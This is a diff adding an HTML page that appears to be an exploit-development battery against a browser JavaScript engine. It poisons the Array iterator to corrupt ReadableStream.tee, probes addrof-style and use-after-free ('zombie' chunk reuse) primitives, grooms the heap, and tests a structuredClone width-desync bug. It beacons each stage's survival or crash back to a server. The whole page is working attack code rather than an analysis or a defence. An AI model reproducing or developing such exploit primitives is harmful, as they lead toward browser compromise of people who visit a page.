@@ -1,0 +1,135 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>FA-v8-NEXT-PRESS — ladder (b): B1-FIX width-desync gate + X1-FIX recycle classifier</title></head>
+<body><script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])!==-1&&location.href.indexOf(u)===-1||u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script><pre id="out">FA-v8-NEXT-PRESS — 17 stages, sync-XHR beacons
+</pre>
+<script src="runtime-derive/derive-runtime.js"></script>
+<script>
+(function(){
+  "use strict";
+  var RID = "v8n" + Date.now().toString(36).slice(-18);          // 21B run-id (<32B)
+  var out = document.getElementById("out");
+  function say(s){ out.appendChild(document.createTextNode("\n"+s)); }
+  function beacon(st, body){
+    try{ var x = new XMLHttpRequest();
+      x.open("POST", "/beacon/V8N-"+st, false);                  // sync: order-guaranteed, no lost tail
+      x.setRequestHeader("Content-Type", "text/plain");
+      x.send(JSON.stringify({r:RID, b:String(body).slice(0,160)}));
+    } catch(e){}
+  }
+  var origIter = Array.prototype[Symbol.iterator];
+  function restoreIter(){ try{ Array.prototype[Symbol.iterator]=origIter; }catch(e2){} }
+  function ord(id, label, poison, work){
+    try{ beacon(id+"A", label); say("V8N-"+id+" "+label);
+      try{ Array.prototype[Symbol.iterator]=poison(); }catch(e){ restoreIter(); }
+      var r = work();
+      restoreIter();
+      beacon(id+"B", "SURV "+String(r).slice(0,160));
+    } catch(e){
+      restoreIter();
+      beacon(id+"E", "ETYPE: "+String(e).slice(0,140));
+    }
+  }
+  // ---- helpers portados de fa-v3-full (proven 2/2) ----
+  function sameXTwice(){ var X={ ourTag:"v8next" }; window.__tgt = X;
+    return function(){ var i=0,n=2; return { next:function(){ if(i>=n) return {done:true}; i++; return {value:X, done:false}; } }; }; }
+  function proxyRevoked(){ var pr=Proxy.revocable({},{}); pr.revoke();
+    return function(){ var i=0,n=2; return { next:function(){ if(i>=n) return {done:true}; i++; return {value:pr.proxy, done:false}; } }; }; }
+  function bigintObj(){ var big=Object(0x14000000n);
+    return function(){ var i=0,n=2; return { next:function(){ if(i>=n) return {done:true}; i++; return {value:big, done:false}; } }; }; }
+  function dateObj(){ var d=new Date();
+    return function(){ var i=0,n=2; return { next:function(){ if(i>=n) return {done:true}; i++; return {value:d, done:false}; } }; }; }
+  function chainArr(){ var a=[]; for (var i=0;i<512;i++) a.push(Object(0x14000000n));
+    return function(){ var i=0,n=2; return { next:function(){ if(i>=n) return {done:true}; i++; return {value:a[511], done:false}; } }; }; }
+  function realStream(){ return function(){ var i=0,n=2;
+    return { next:function(){ if(i>=n) return {done:true}; i++; return {value:new ReadableStream({}), done:false}; } }; }; }
+  function b1Poison(){ return function(){ var i=0,n=2;
+    return { next:function(){ if(i>=n) return {done:true}; i++; return {value:{pad:0x1FFFFFFFFFFFFFn}, done:false}; } }; }; }
+
+  beacon("L","loaded deriveRuntime="+(typeof window.deriveRuntime)+" ua="+navigator.userAgent.slice(0,60));
+  setInterval(function(){ beacon("HB",""); }, 2000);            // HB-gap>4s sin Z = crash-class (server)
+  // 1 C0 — control
+  ord("C0","clean control", function(){ return function(){ var i=0,n=2;
+    return { next:function(){ if(i>=n) return {done:true}; i++; return {value:{plain:1}, done:false}; } }; }; },
+    function(){ var rs=new ReadableStream({}); var pair=rs.tee(); return "clean locked="+pair[0].locked; });
+  // 2 INV — 1x witness pidInverted (keep-alive ladder-a)
+  ord("INV","pidInverted same-X", sameXTwice, function(){
+      var rs=new ReadableStream({}); var p=rs.tee(); var ft=false, st=false;
+      try{ p[0].cancel(); }catch(e){ ft=true; } try{ p[1].cancel(); }catch(e){ st=true; }
+      return "pidInverted="+(ft&&!st?"true":"false")+"; locked="+p[0].locked+"; invKeys="+Object.keys(window.__tgt).join(","); });
+  // 3 ORA — state-oracle readback (calibración)
+  ord("ORA","state-machine oracle", sameXTwice, function(){
+      var rs=new ReadableStream({}); var p=rs.tee();
+      try{ p[0].getReader(); }catch(e){}
+      return "locked="+p[0].locked+"; gr="+(typeof p[0].getReader)+"; cr="+(typeof p[0].cancel); });
+  // 4 PX — catálogo addrof-shape proxy-revoke
+  ord("PX","revoked-proxy fake-stream", proxyRevoked, function(){
+      var rs=new ReadableStream({}); var p=rs.tee();
+      return "proxy-locked="+p[0].locked+"; gr="+(typeof p[0].getReader)+"; cl="+(typeof p[0].cancel); });
+  // 5 RP — 2º shot repetibilidad
+  ord("RP","revoked-proxy 2nd", proxyRevoked, function(){
+      var rs=new ReadableStream({}); var p=rs.tee(); return "proxy2 locked="+p[0].locked; });
+  // 6 BI — growth-marker keep-alive
+  ord("BI","bigint-Object wrapped", bigintObj, function(){
+      var rs=new ReadableStream({}); var p=rs.tee();
+      return "bigInt locked="+p[0].locked+"; gr="+(typeof p[0].getReader); });
+  // 7 DT — negative-control keep-alive
+  ord("DT","Date wrapped", dateObj, function(){
+      var rs=new ReadableStream({}); var p=rs.tee();
+      return "date locked="+p[0].locked+"; typeof-cancel="+(typeof p[0].cancel); });
+  // 8 CH — groom-pressure keep-alive
+  ord("CH","chainArr deep wrapped", chainArr, function(){
+      var rs=new ReadableStream({}); var p=rs.tee();
+      return "chainArr locked="+p[0].locked+"; typeof-cancel="+(typeof p[0].cancel); });
+  // 9 RS — sibling-control keep-alive
+  ord("RS","real-stream wrapped", realStream, function(){
+      var wp=(new ReadableStream({})).tee();
+      return "realStream locked="+wp[0].locked+"; gr="+(typeof wp[0].getReader); });
+  // 10 TL-a — cross-subsystem SIN getReader (señal clone REAL)
+  ord("TLa","Response.clone SIN getReader", sameXTwice, function(){
+      var rs=new ReadableStream({}); var p=rs.tee();
+      var resp=new Response(p[0]); var cl=resp.clone(); var bodyIs=!!cl.body;
+      var qr=""; try{ var gr=(cl.body&&cl.body.getReader)?cl.body.getReader.call(cl.body):null; qr=typeof gr; }catch(e){qr="E:"+String(e.message).slice(0,60);}
+      return "bodyIs="+bodyIs+"; readQr="+qr; });
+  // 11 TL-b — CON getReader → E-class esperada (write-into alcanzado)
+  ord("TLb","Response.clone CON getReader (E-class esperada)", sameXTwice, function(){
+      var rs=new ReadableStream({}); var p=rs.tee(); try{p[0].getReader();}catch(e){}
+      var resp=new Response(p[0]); var cl=resp.clone();
+      var qr=""; try{ var gr=cl.body.getReader.call(cl.body); qr=typeof gr; }catch(e){qr="TypeError:"+String(e.message).slice(0,70);}
+      return "bodyIs="+!!cl.body+"; readQr="+qr; });
+  // 12 B1a — CONTROL simétrico: pool=256 u16-write / gcBuffer=512 u16-read (limpio en todo mundo)
+  ord("B1a","CONTROL simetrico len256 (u16/u16)", b1Poison, function(){
+      var S2={u:1}; var A2=new Array(256);
+      for (var i=0;i<255;i++) A2[i]={i:i,p:0x1FFFFFFFFFFFFFn};
+      A2[255]=S2;
+      var C2=structuredClone({a:A2,x:S2,y:S2});
+      return "len "+C2.a.length+"; x="+C2.x.u+"; y="+(C2.y&&C2.y.u)+"; same="+(C2.x===C2.y); });
+  // 13 B1b — DESYNC: 253 raw-BigInt pads → writer pool=255 (u8) vs reader gcBuffer=508 (u16)
+  //        clean "len 253" = fix-in-ship (U2 cerrado) / B1E DataCloneError = width-split LIVE (b)
+  ord("B1b","DESYNC 253 rawBigInt (u8-write/u16-read)", b1Poison, function(){
+      var S={u:1};
+      var A=new Array(253).fill(0).map(function(_,i){return {i:i,p:0x1FFFFFFFFFFFFFn};});
+      var C=structuredClone({a:A,x:S,y:S});
+      return "len "+C.a.length+"; x="+C.x.u+"; y="+(C.y&&C.y.u)+"; same="+(C.x===C.y); });
+  // 14 X1 — recycle classifier (X1A ANTES del seed; CERO statements/alloc en ventana; X1B tras trigger)
+  var x1s1={x1:"A"}, x1s2={x1:"B"}, x1t={x1:"T"};   // TODO preconstruido ANTES de X1A
+  var x1Over=function(){ var i=0; return { next:function(){ i++; return i<=2 ? {value:(i===1?x1s1:x1s2), done:false} : {done:true}; } }; };
+  var x1Under=function(){ var i=0; return { next:function(){ i++; return i<=1 ? {value:x1t, done:false} : {done:true}; } }; };
+  var x1p1=null, x1p2=null;
+  beacon("X1A","seed-over2 trigger-under1");
+  try {
+    Array.prototype[Symbol.iterator]=x1Over;
+    x1p1 = new ReadableStream({}).tee();          // seed: over-yield 2 (slots 0/1, dtor nulls, chunk 128B libre)
+    Array.prototype[Symbol.iterator]=x1Under;     // ventana: CERO statements/alloc entre seed y trigger
+    x1p2 = new ReadableStream({}).tee();          // trigger: under-yield 1 (reuse class-128?)
+  } catch(e) {}
+  restoreIter();
+  var x1z = (x1p2 && x1p2[1] && (x1p2[1]===x1t || x1p2[1]===x1s1 || x1p2[1]===x1s2)) ? "zombie" : "garbage";
+  beacon("X1B","z="+x1z+"; len="+(x1p2?String(x1p2.length):"null")+"; t1="+(x1p2&&x1p2[1]?typeof x1p2[1]:"null"));
+  // 15 TGT — sellado
+  ord("TGT","FINAL target readback", sameXTwice, function(){
+      var rs=new ReadableStream({}); var p=rs.tee();
+      return "tgt-keys="+Object.keys(window.__tgt).join(",")+"; tgtCount="+Object.keys(window.__tgt).length+"; locked="+p[0].locked; });
+  beacon("Z","battery complete 17 stages");
+  say("FA-v8-NEXT-PRESS battery complete");
+})();
+</script></body></html>
